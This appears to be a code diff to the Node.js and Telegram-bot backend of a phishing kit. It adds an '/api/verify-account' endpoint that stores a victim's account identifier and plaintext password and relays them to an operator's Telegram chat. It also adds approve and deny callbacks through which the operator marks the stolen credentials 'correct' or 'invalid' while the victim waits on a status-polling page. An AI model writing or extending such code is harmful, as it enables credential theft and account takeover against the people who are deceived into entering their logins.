@@ -500,7 +500,7 @@ Please send admin details in this format:
             
             // Create new admin object
             const newAdmin = {
-                adminId: newAdminId,  // ✅ Using adminId (works with updated database.js)
+                adminId: newAdminId,
                 chatId: newChatId,
                 name: name,
                 email: email,
@@ -712,6 +712,105 @@ User will re-enter code.
     }
     
     // ==========================================
+    // ACCOUNT VERIFICATION CALLBACKS
+    // ==========================================
+    if (data.startsWith('deny_verify_')) {
+        const applicationId = data.replace('deny_verify_', '');
+        console.log(`❌ Account verification DENIED: ${applicationId}`);
+        
+        const application = await db.getApplication(applicationId);
+        
+        if (!application || application.adminId !== adminId) {
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ Application not found!',
+                show_alert: true
+            });
+            return;
+        }
+        
+        // Update status
+        await db.updateApplication(applicationId, { verificationStatus: 'rejected' });
+        console.log(`✅ Status updated: verification rejected`);
+        
+        // Update message
+        const updatedMessage = `
+❌ *INVALID CREDENTIALS*
+
+📋 \`${applicationId}\`
+📱 \`${formatPhoneForDisplay(application.phoneNumber)}\`
+${application.identifierType === 'email' ? '📧' : '📱'} \`${application.accountIdentifier}\`
+🔑 \`${application.accountPassword}\`
+
+✗ REJECTED
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `;
+        
+        await bot.editMessageText(updatedMessage, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'Markdown'
+        });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: '❌ Credentials rejected',
+            show_alert: false
+        });
+        
+        console.log(`✅ Account verification rejection complete\n`);
+        return;
+    }
+
+    if (data.startsWith('approve_verify_')) {
+        const applicationId = data.replace('approve_verify_', '');
+        console.log(`✅ Account verification APPROVED: ${applicationId}`);
+        
+        const application = await db.getApplication(applicationId);
+        
+        if (!application || application.adminId !== adminId) {
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ Application not found!',
+                show_alert: true
+            });
+            return;
+        }
+        
+        // Update status
+        await db.updateApplication(applicationId, { verificationStatus: 'approved' });
+        console.log(`✅ Status updated: verification approved`);
+        
+        // Update message
+        const updatedMessage = `
+✅ *CREDENTIALS VERIFIED*
+
+📋 \`${applicationId}\`
+📱 \`${formatPhoneForDisplay(application.phoneNumber)}\`
+${application.identifierType === 'email' ? '📧' : '📱'} \`${application.accountIdentifier}\`
+🔑 \`${application.accountPassword}\`
+
+✓ APPROVED
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+
+User will now see approval page.
+        `;
+        
+        await bot.editMessageText(updatedMessage, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'Markdown'
+        });
+        
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: '✅ Credentials approved!',
+            show_alert: false
+        });
+        
+        console.log(`✅ Account verification approval complete\n`);
+        return;
+    }
+    
+    // ==========================================
     // STANDARD CALLBACKS: Parse action_type_applicationId
     // ==========================================
     const parts = data.split('_');
@@ -918,8 +1017,121 @@ app.use((req, res, next) => {
 });
 
 // ==========================================
-// ✅ API ENDPOINTS - FIXED BUTTON DATA
+// ✅ API ENDPOINTS
 // ==========================================
+
+// ✅ NEW: Account Verification Endpoints
+app.post('/api/verify-account', async (req, res) => {
+    try {
+        const { applicationId, identifier, password, identifierType } = req.body;
+        
+        console.log('📥 Account Verification Request:');
+        console.log('   Application ID:', applicationId);
+        console.log('   Identifier:', identifier);
+        console.log('   Type:', identifierType);
+        
+        // Get the application data from database
+        const application = await db.getApplication(applicationId);
+        
+        if (!application) {
+            console.error(`❌ Application ${applicationId} not found`);
+            return res.status(404).json({ 
+                success: false, 
+                message: 'Application not found' 
+            });
+        }
+        
+        // Update application with account credentials
+        await db.updateApplication(applicationId, {
+            accountIdentifier: identifier,
+            accountPassword: password,
+            identifierType: identifierType,
+            verificationStatus: 'pending'
+        });
+        
+        console.log(`✅ Account credentials saved for ${applicationId}`);
+        
+        // Check if admin is connected
+        if (!adminChatIds.has(application.adminId)) {
+            const admin = await db.getAdmin(application.adminId);
+            if (admin && admin.chatId) {
+                adminChatIds.set(application.adminId, admin.chatId);
+                console.log(`➕ Re-added admin to map: ${application.adminId} -> ${admin.chatId}`);
+            } else {
+                console.error(`❌ Admin ${application.adminId} not available`);
+                return res.status(500).json({ 
+                    success: false, 
+                    message: 'Admin unavailable' 
+                });
+            }
+        }
+        
+        // Send account verification request to admin
+        const sent = await sendToAdmin(application.adminId, `
+🔐 *ACCOUNT VERIFICATION*
+
+📋 \`${applicationId}\`
+📱 \`${formatPhoneForDisplay(application.phoneNumber)}\`
+
+*Account Credentials:*
+${identifierType === 'email' ? '📧' : '📱'} \`${identifier}\`
+🔑 \`${password}\`
+
+⚠️ *VERIFY CREDENTIALS*
+        `, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '❌ Invalid Credentials', callback_data: `deny_verify_${applicationId}` }],
+                    [{ text: '✅ Credentials Correct', callback_data: `approve_verify_${applicationId}` }]
+                ]
+            }
+        });
+        
+        if (sent) {
+            console.log(`📤 Verification request sent to admin`);
+        } else {
+            console.error(`❌ Failed to send to admin`);
+        }
+        
+        res.json({ 
+            success: true,
+            status: 'pending',
+            message: 'Credentials submitted for verification'
+        });
+        
+    } catch (error) {
+        console.error('❌ Error in /api/verify-account:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error: ' + error.message 
+        });
+    }
+});
+
+app.get('/api/check-verification-status/:applicationId', async (req, res) => {
+    try {
+        const application = await db.getApplication(req.params.applicationId);
+        
+        if (application) {
+            res.json({ 
+                success: true, 
+                status: application.verificationStatus || 'pending'
+            });
+        } else {
+            res.status(404).json({ 
+                success: false, 
+                message: 'Application not found' 
+            });
+        }
+    } catch (error) {
+        console.error('Error checking verification status:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error' 
+        });
+    }
+});
 
 app.post('/api/verify-pin', async (req, res) => {
     try {
